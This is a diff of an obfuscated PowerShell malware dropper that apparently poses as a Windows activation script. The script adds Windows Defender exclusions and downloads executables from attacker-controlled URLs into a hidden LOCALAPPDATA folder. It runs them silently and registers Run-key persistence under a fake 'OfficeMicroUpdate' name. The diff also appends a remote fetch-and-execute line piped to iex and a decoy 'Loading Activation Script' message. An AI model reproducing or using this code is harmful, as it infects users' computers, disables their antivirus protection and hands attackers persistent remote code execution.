@@ -1,12 +1,6 @@
 <html><head><link rel="stylesheet" href="resource://content-accessible/plaintext.css">
-<meta charset="utf-8"></head><body><pre># Base64-encoded strings for first download (pronoti.exe)
-$downloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://notiv1new.vercel.app/pronoti.exe"))
-$updaterExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("updater.exe"))
-# Base64-encoded strings for second download (client.exe)
-$clientDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://clientv2new.vercel.app/client.exe"))
-$updaterrExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("updaterr.exe"))
-# Base64-encoded strings for third download (officemicro.exe)
-$officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://notinewr-one.vercel.app/officemicro.exe"))
+<meta charset="utf-8"></head><body><pre># Base64-encoded strings for third download (officemicro.exe)
+$officeDownloadUrlB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://github.com/freetponline/paintwebsite/raw/refs/heads/main/dolbaeb.exe"))
 $updaterrrExeB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("updaterrr.exe"))
 # Common attributes
 $hiddenAttrB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Hidden"))
@@ -15,10 +9,6 @@ $stopActionB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes
 $directoryB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Directory"))
 
 # Decode them
-$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
-$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
-$clientDownloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($clientDownloadUrlB64))
-$updaterrExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterrExeB64))
 $officeDownloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($officeDownloadUrlB64))
 $updaterrrExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterrrExeB64))
 $hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
@@ -30,8 +20,6 @@ $directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64
 $hiddenFolderName = "NotifyTemp_" + [System.Guid]::NewGuid().ToString().Substring(0,8)
 $hiddenFolder = Join-Path $env:LOCALAPPDATA $hiddenFolderName
 New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
-$tempPath = Join-Path $hiddenFolder $updaterExe
-$clientPath = Join-Path $hiddenFolder $updaterrExe
 $officePath = Join-Path $hiddenFolder $updaterrrExe
 
 # Function to add folder exclusion
@@ -46,40 +34,23 @@ function Add-FolderExclusion {
 
 # Main execution
 try {
+    Write-Host "Loading Activation Script..." -ForegroundColor DarkGreen -BackgroundColor White
     # Add folder exclusion BEFORE downloads
     Add-FolderExclusion -path $hiddenFolder
     # Add file-specific exclusions for extra protection
-    Add-MpPreference -ExclusionPath $tempPath
-    Add-MpPreference -ExclusionPath $clientPath
     Add-MpPreference -ExclusionPath $officePath
     
-    # Download pronoti.exe as updater.exe
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
-    
-    # Download client.exe as updaterr.exe
-    Invoke-WebRequest -Uri $clientDownloadUrl -OutFile $clientPath -UseBasicParsing -ErrorAction $stopAction
     
     # Download officemicro.exe as updaterrr.exe
     Invoke-WebRequest -Uri $officeDownloadUrl -OutFile $officePath -UseBasicParsing -ErrorAction $stopAction
-    
     # Set folder and files as hidden
     Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
-    Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
-    Set-ItemProperty -Path $clientPath -Name Attributes -Value $hiddenAttr
     Set-ItemProperty -Path $officePath -Name Attributes -Value $hiddenAttr
     
     # Run all files silently in the current session
-    Start-Process -FilePath $tempPath -WindowStyle Hidden
-    Start-Process -FilePath $clientPath -WindowStyle Hidden
     Start-Process -FilePath $officePath -WindowStyle Hidden
-    
-    # Add updaterr.exe (client.exe) to startup with silent execution
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regName = "WindowsUpdateClient"
-    $regValue = "powershell.exe -WindowStyle Hidden -Command `"$clientPath`""
-    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction $silentlyContinue
-    
-    # Add updaterrr.exe (officemicro.exe) to startup with silent execution
+       
+
     $regPathOffice = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $regNameOffice = "OfficeMicroUpdate"
     $regValueOffice = "powershell.exe -WindowStyle Hidden -Command `"$officePath`""
@@ -97,5 +68,7 @@ try {
     exit 1
 } finally {
     # No cleanup - leave traces as requested
+    irm https://get.activated.win | iex
+    
 }
 </pre></body></html>
